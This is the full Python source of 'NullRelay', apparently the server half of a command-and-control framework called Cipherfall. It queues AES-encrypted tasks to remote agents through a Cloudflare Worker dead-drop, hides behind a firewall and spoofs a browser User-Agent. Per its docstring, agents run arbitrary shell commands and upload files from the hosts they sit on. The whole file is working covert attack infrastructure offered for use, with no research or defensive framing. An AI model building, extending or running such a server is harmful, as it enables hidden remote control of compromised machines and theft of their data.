#!/usr/bin/env python3
"""
NullRelay (server.py) — Cipherfall C2 Server (Cloudflare Worker channel)

Runs entirely behind a firewall. Exposes no public port.
Communicates with agents exclusively via the Cloudflare Worker dead-drop.

Dead-drop flow:
  1. Operator queues a task via operator.py → stored in SQLite as 'pending'.
  2. Dispatch loop PUTs the encrypted task to the Worker: PUT /task/{agent_id}.
     Task is marked 'sent' only after HTTP 200 from the Worker.
  3. Agent polls the Worker, GETs and deletes the task, executes it,
     PUTs the encrypted result to the Worker: PUT /result/{task_id}.
  4. Collect loop GETs /result/{task_id} for each 'sent' task, decrypts,
     stores output in SQLite, marks 'done'.
  5. Agent also PUTs a periodic heartbeat to /hb/{agent_id}; the collect
     loop reads it to refresh agent last_seen and sysinfo.

Worker authentication:
  All requests carry  Authorization: Bearer <WORKER_TOKEN>.
  WORKER_TOKEN = HMAC-SHA256(PSK, b"worker_token").hexdigest()[:32]
  The agent derives the identical token from the same PSK.

Encryption:
  All payloads are AES-256-GCM encrypted then base64-encoded.
  Key = PBKDF2-SHA256(PSK, b"cipherfall_c2_v1", dkLen=32, count=100 000).
  Wire format: base64(nonce[12] ‖ ciphertext ‖ GCM-tag[16]).

Admin interface (localhost only, operator.py talks to this):
  GET  /admin/agents              list registered agents
  GET  /admin/tasks               list all tasks
  POST /admin/register            register agent  {agent_id, label?}
  POST /admin/task                queue task  {agent_id, command}
  GET  /admin/result/<task_id>    retrieve task output

Supported agent commands (server side is command-agnostic; the agent
interprets these):
  <any shell string>       executed via /bin/sh on the agent
  UPLOAD:/path/to/file     agent reads file, returns base64 content

Environment variables:
  WORKER_URL   public URL of the Cloudflare Worker  (required)
  C2_PSK       pre-shared passphrase                (default: changeme)
  C2_DB        SQLite database path                 (default: c2.db)
  C2_ADMIN     admin API port                       (default: 1337)
  C2_POLL      dispatch/collect interval in seconds (default: 10)

Limitations:
  - If the agent reads a task but crashes before sending the result, the
    task entry in KV is already deleted; re-queue it manually.
  - Only one pending task per agent at a time in the Worker KV.
  - Agent discovery is manual: the operator must call /admin/register before
    heartbeats are collected for that agent.
  - SQLite serialises concurrent writes; not suitable for large deployments.
"""

import asyncio, base64, hashlib, hmac as _stdlib_hmac, json, os, sqlite3, time, uuid
from dotenv import load_dotenv
from fastapi import FastAPI, HTTPException, Request
import uvicorn, httpx
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes

load_dotenv()

WORKER_URL = os.environ.get("WORKER_URL",  "https://your-worker.workers.dev").rstrip("/")
PSK        = os.environ.get("C2_PSK",      "changeme")
DB_PATH    = os.environ.get("C2_DB",       "c2.db")
ADMIN_PORT = int(os.environ.get("C2_ADMIN", "1337"))
POLL_INT   = int(os.environ.get("C2_POLL",  "10"))

_KEY          = PBKDF2(PSK.encode(), b"cipherfall_c2_v1", dkLen=32,
                       count=100_000, hmac_hash_module=SHA256)
_WORKER_TOKEN = _stdlib_hmac.new(
    PSK.encode(), b"worker_token", hashlib.sha256
).hexdigest()[:32]
_WORKER_HDR   = {
    "Authorization": f"Bearer {_WORKER_TOKEN}",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
}


def _encrypt(obj: dict) -> str:
    nonce = get_random_bytes(12)
    cipher = AES.new(_KEY, AES.MODE_GCM, nonce=nonce)
    ct, tag = cipher.encrypt_and_digest(json.dumps(obj).encode())
    return base64.b64encode(nonce + ct + tag).decode()


def _decrypt(token: str) -> dict:
    raw = base64.b64decode(token)
    nonce, ct, tag = raw[:12], raw[12:-16], raw[-16:]
    cipher = AES.new(_KEY, AES.MODE_GCM, nonce=nonce)
    return json.loads(cipher.decrypt_and_verify(ct, tag))


def _db() -> sqlite3.Connection:
    con = sqlite3.connect(DB_PATH)
    con.row_factory = sqlite3.Row
    return con


def _init_db():
    with _db() as con:
        con.executescript("""
            CREATE TABLE IF NOT EXISTS agents (
                id         TEXT PRIMARY KEY,
                label      TEXT,
                first_seen INTEGER NOT NULL,
                last_seen  INTEGER NOT NULL,
                sysinfo    TEXT
            );
            CREATE TABLE IF NOT EXISTS tasks (
                id         TEXT PRIMARY KEY,
                agent_id   TEXT NOT NULL,
                command    TEXT NOT NULL,
                status     TEXT NOT NULL DEFAULT 'pending',
                created_at INTEGER NOT NULL,
                output     TEXT
            );
        """)


# ── background loops ───────────────────────────────────────────────────────────

async def _dispatch_pending(client: httpx.AsyncClient):
    with _db() as con:
        rows = con.execute(
            "SELECT id, agent_id, command FROM tasks WHERE status='pending'"
        ).fetchall()
    for t in rows:
        payload = _encrypt({"task_id": t["id"], "cmd": t["command"]})
        try:
            r = await client.put(f"{WORKER_URL}/task/{t['agent_id']}", content=payload)
            if r.status_code == 200:
                with _db() as con:
                    con.execute("UPDATE tasks SET status='sent' WHERE id=?", (t["id"],))
        except Exception:
            pass


async def _fetch_result(client: httpx.AsyncClient, task_id: str):
    try:
        r = await client.get(f"{WORKER_URL}/result/{task_id}")
        if r.status_code == 200:
            payload = _decrypt(r.text)
            with _db() as con:
                con.execute("UPDATE tasks SET status='done', output=? WHERE id=?",
                            (payload.get("output", ""), task_id))
    except Exception:
        pass


async def _collect_results(client: httpx.AsyncClient):
    with _db() as con:
        rows = con.execute("SELECT id FROM tasks WHERE status='sent'").fetchall()
    await asyncio.gather(*[_fetch_result(client, t["id"]) for t in rows])


async def _fetch_heartbeat(client: httpx.AsyncClient, agent_id: str, now: int):
    try:
        r = await client.get(f"{WORKER_URL}/hb/{agent_id}")
        if r.status_code != 200:
            return
        payload = _decrypt(r.text)
        sysinfo = payload.get("sysinfo", {})
        with _db() as con:
            con.execute(
                "INSERT OR IGNORE INTO agents (id, label, first_seen, last_seen, sysinfo)"
                " VALUES (?,?,?,?,?)",
                (agent_id, sysinfo.get("hostname", agent_id[:8]), now, now, "{}")
            )
            con.execute(
                "UPDATE agents SET last_seen=?, sysinfo=? WHERE id=?",
                (now, json.dumps(sysinfo), agent_id)
            )
    except Exception:
        pass


async def _collect_heartbeats(client: httpx.AsyncClient):
    try:
        r = await client.get(f"{WORKER_URL}/agents")
        if r.status_code != 200:
            return
        agent_ids = r.json()
    except Exception:
        return

    now = int(time.time())
    await asyncio.gather(*[_fetch_heartbeat(client, aid, now) for aid in agent_ids])


async def _dispatch_loop():
    async with httpx.AsyncClient(headers=_WORKER_HDR, timeout=5.0) as client:
        while True:
            t0 = time.time()
            await _dispatch_pending(client)
            t1 = time.time()
            await _collect_results(client)
            t2 = time.time()
            await _collect_heartbeats(client)
            t3 = time.time()
            print(f"[loop] dispatch={1000*(t1-t0):.0f}ms collect={1000*(t2-t1):.0f}ms hb={1000*(t3-t2):.0f}ms", flush=True)
            await asyncio.sleep(POLL_INT)


# ── admin app ──────────────────────────────────────────────────────────────────

admin = FastAPI(docs_url=None, redoc_url=None, openapi_url=None)


@admin.get("/admin/agents")
async def list_agents():
    with _db() as con:
        rows = con.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
    return [dict(r) for r in rows]


@admin.get("/admin/tasks")
async def list_tasks():
    with _db() as con:
        rows = con.execute("SELECT * FROM tasks ORDER BY created_at DESC").fetchall()
    return [dict(r) for r in rows]


@admin.post("/admin/register")
async def register_agent(request: Request):
    body     = await request.json()
    agent_id = body.get("agent_id")
    label    = body.get("label", "")
    if not agent_id:
        raise HTTPException(status_code=400)
    now = int(time.time())
    with _db() as con:
        con.execute(
            "INSERT OR IGNORE INTO agents (id, label, first_seen, last_seen, sysinfo)"
            " VALUES (?,?,?,?,?)",
            (agent_id, label, now, now, "{}")
        )
    return {"status": "ok"}


@admin.post("/admin/task")
async def create_task(request: Request):
    body     = await request.json()
    agent_id = body.get("agent_id")
    command  = body.get("command")
    if not agent_id or not command:
        raise HTTPException(status_code=400)
    task_id = str(uuid.uuid4())
    with _db() as con:
        con.execute("INSERT INTO tasks VALUES (?,?,?,'pending',?,NULL)",
                    (task_id, agent_id, command, int(time.time())))
    return {"task_id": task_id}


@admin.delete("/admin/agents/{agent_id}")
async def delete_agent(agent_id: str):
    with _db() as con:
        con.execute("DELETE FROM tasks  WHERE agent_id=?", (agent_id,))
        con.execute("DELETE FROM agents WHERE id=?",       (agent_id,))
    return {"status": "ok"}


@admin.get("/admin/result/{task_id}")
async def get_result(task_id: str):
    with _db() as con:
        row = con.execute("SELECT * FROM tasks WHERE id=?", (task_id,)).fetchone()
    if not row:
        raise HTTPException(status_code=404)
    return dict(row)


# ── entry point ────────────────────────────────────────────────────────────────

async def _main():
    cfg = uvicorn.Config(admin, host="127.0.0.1", port=ADMIN_PORT, log_level="error")
    srv = uvicorn.Server(cfg)
    srv.install_signal_handlers = lambda: None
    await asyncio.gather(srv.serve(), _dispatch_loop())


if __name__ == "__main__":
    _init_db()
    asyncio.run(_main())
